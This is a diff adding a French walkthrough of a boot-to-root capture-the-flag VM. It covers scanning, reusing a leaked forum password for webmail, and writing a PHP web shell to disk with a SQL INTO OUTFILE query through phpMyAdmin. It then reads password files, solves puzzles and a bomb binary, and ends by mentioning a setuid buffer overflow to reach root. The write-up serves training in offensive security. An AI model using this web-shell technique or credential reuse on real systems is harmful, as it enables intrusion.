@@ -1,0 +1,210 @@
+cmd: nmap 192.168.56.1/24
+nous permet de decouvrir l'adresse ip de la machine virtuelle ainsi que les
+services qui tournent dessus. On remarque les ports 80 et 443 qui sont ouverts
+ce qui laisse penser qu'un serveur web tourne sur la vm.
+
+Un site http et un autre https sont présents. Commençons par essayer de regarder
+du coté du https.
+
+cmd: dirb https://192.168.56.105
+nous donne une liste des urls possibles sur ce domaine. L'un d'entre eux est
+assez intéressant: forum.
+
+site: https://192.168.56.105/forum
+sur ce forum, un poste montre les essais de log de connexion au forum. En lisant
+assez attentivement, on remarque une tentative avec un user ressemblant à un mot
+de passe: !q\]Ej?*5K5cy*AJ
+On peut se dire que l'utilisateur s'est trompé et à écris son mot de passe à
+la place de son login, donc on regarde quel est le prochain user à se connecter
+sur le forum. On voit que 30 seconde plus tard le user lmezard s'est connecté
+et Bingo!, avec le combo !q\]Ej?*5K5cy*AJ / lmezard
+On est connecté au compte de lmezard
+Depuis son compte on peut allez regarder les settings et notement voir son adresse
+mail.
+
+site: https://192.168.56.105/webmail
+On va donc se dire que son mot de passe et le même pour sa boite mail.
+On se rend donc sur le site https://192.168.105/webmail remarquer grace a la commande
+au dessus. Ici on entre donc l'user laurie@borntosec.net et le mot de passe
+!q\]Ej?*5K5cy*AJ . On arrive donc sur sa boite mail dans laquelle un mail est
+intéressant, il contient aperement les parametres de connection à la database:
+root/Fg-'kKXBj87E:aJ$
+
+site: https://192.168.56.105/phpmyadmin
+Avec le couple user/passwd obtenu juste avant, on peut se connecter sur cette
+page gérant la base de donnée. Notre but va maintenant être de créer un reverse
+shell en utilisant les requête SQL. Pour se faire nous pouvons nous rendre
+dans n'importe quel table de notre database remplacer un champ et y mettre notre
+backdoor puis SELECT ce champ et le mettre dans un fichier de sortie.
+Avec la commande dirb on a pu voir tous les dossiers disponible depuis forum.
+Sur tous les dossiers obtenus, seul le dossier templates_c est "writable", c'est
+donc ici que nous allons mettre notre backdoor.
+Changeons le user_name de zaz par:
+<?php  $cmd=$_GET['exec']; system($cmd); ?>
+----- piste qui n'a pas fonctionné
+avec l'accès à la db, il est possible de changer le hash des mots de passes de
+tous les users, nottament l'admin. Il est donc possible de remplacer le mot de
+passe de l'admin par un mot de passe que l'on connait. Une fois sur le compte
+admin, on peut faire ce que l'on veut sur le site.
+-----
+
+puis effectuons la requête suivante:
+SELECT user_name FROM `mlf2_userdata` WHERE user_id=6 INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
+
+maintenant, nous pouvons effectuer des commandes sur la vm avec un url de la sorte:
+https://192.168.56.105/forum/templates_c/backdoor.php?exec=COMMANDE
+
+les commandes que nous pouvons faire pour avancer sont:
+whoami                      -> connaitre notre login
+find / -user www-data       -> connaitre les fichiers qui nous sont déstinés
+                             |-> on voit nottament le fichier /home/LOOKATME/password
+                                 qui nous donne un login et un password
+cat /home/LOOKATME/password -> On obtient le login/password suivant:
+                             |->     lmezard:G!@M6f4Eatau{sF"
+
+connection via ftp à la vm:
+On se rend compte que le login/password ne fonctionne pas sur ssh mais sur un
+serveur ftp qui tourne sur la vm. On peut donc simplement rentrer notre login/pass
+avec la commande suivante: ftp 192.168.56.105
+sur le serveur, il y 2 fichiers: README et fun.
+Le readme nous indique de faire le défi que propose fun. En utilisant la commande
+file fun, on se rend compte que c'est un fichier .zip et qu'il faut le déziper.
+On utilise la commande: tar -xvf fun
+à l'intèrieur, beaucoup de fichier au format .pcap. Au final, rien à voir avec
+les captures réseaux, mais lorsqu'on cat les file, on ne voit que des bout de codes.
+Après un temps de réflexion et de recherche, on remarque qu'un fichier
+possède du code en C mais il manque la moitié des fonctions nécessaires. Après
+quelque tentative, on se rend compte que c'est la concaténation du premier au
+dernier fichier selon leur numéro qui donne ces fonctions. Il faut en plus enlever
+beaucoup de code pubelle. Après la reconstitution, nous avons:
+
+commandes utiles:
+grep -A 2 "getme" *
+grep -A 2 "return" *
+
+--------------------------------------------------------------------------------
+#include <stdio.h>    //file number
+
+char getme1() {       //5
+	return 'I';       //6
+}
+
+char getme2() {       //37
+	return 'h';       //38
+}
+
+char getme3() {       //56
+	return 'e';       //57
+}
+
+char getme4() {       //115
+	return 'a';       //116
+}
+
+char getme5() {       //368
+	return 'r';       //369
+}
+
+char getme6() {       //521
+	return 't';       //522
+}
+
+char getme7() {       //736
+	return 'p';       //737
+}
+
+char getme8() {
+	return 'w';
+}
+
+char getme9() {
+	return 'n';
+}
+
+char getme10() {
+	return 'a';
+}
+
+char getme11() {
+	return 'g';
+}
+
+char getme12()
+{
+	return 'e';
+}
+
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+
+--------------------------------------------------------------------------------
+
+Après execution du code, on obtient l'output suivant:
+
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+
+et avec le résultat de Iheartpwnage en sha256, on obtient le couple login/pass
+suivant:
+laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+Nous voila enfin connecté sur la VM avec ssh. C'est ici que commence l'escalade
+des privilèges. Pour accéder au compte de thor, il faut apperement defuse une bomb.
+Cette bombe est un binaire avec 6 phases de diffusion que l'on doit traverser
+pour obtenir le mot de passe. En décompilant le binaire avec ghidra, on peut
+facilement comprendre quels sont les résultats des 5 premières phases mais la
+6ème est un peu plus compliquée. Pour nous aider, nous avons un indice nous disant
+que le premier chiffre sur 6 est 4 et on va se servir d'un programme pour générer
+tous les patterns possibles qui respectent certaines contraintes vu dans le binaire
+décompilé. Vous pouvez voir ce programme dans le fichier defuser.py. Ensuite
+on remarque aussi une phase secrete que l'on peut obtenir en ajoutant austinpowers
+à la réponse numéro 4. La phase secrete est aussi simple que les 5 premières phases.
+Bon la phase secrete ne sert en fait à rien pour l'obtention du mot de passe
+mais il faut maintenant concaténer toutes les réponses pour obtenir le password
+de thor, ce qui nous donne:
+
+thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+(noté qu'il y a un bug dans la vm je pense, vu que la derniere phase est 426315
+mais il faut rentrer 426135 pour le password... A noter aussi que cet exercice
+est pas incroyable étant donné que pour les phases 3 et 5, de multiples réponses
+sont possibles, même en suivant les indices).
+
+Sur la session de thor, un fichier appelé turtle nous dit comment écrire un mot
+en tracant des traits. En utilisant paint et en suivant les instructions, on obtient
+le mot SLASH en majuscule, il nous faut maintenant le hasher comme le dit le fichier
+turtle. La bonne fonction de hash est le md5. Ce qui nous donne le login/passwd
+pour le user zaz:     zaz:646da671ca01bb5d84dbb5fb2238dc8e
+
+Sur la session de zaz un simplissime buffer overflow avec du shellcode nous donnera
+l'accès root vu que le binaire exploit_me est setuid.
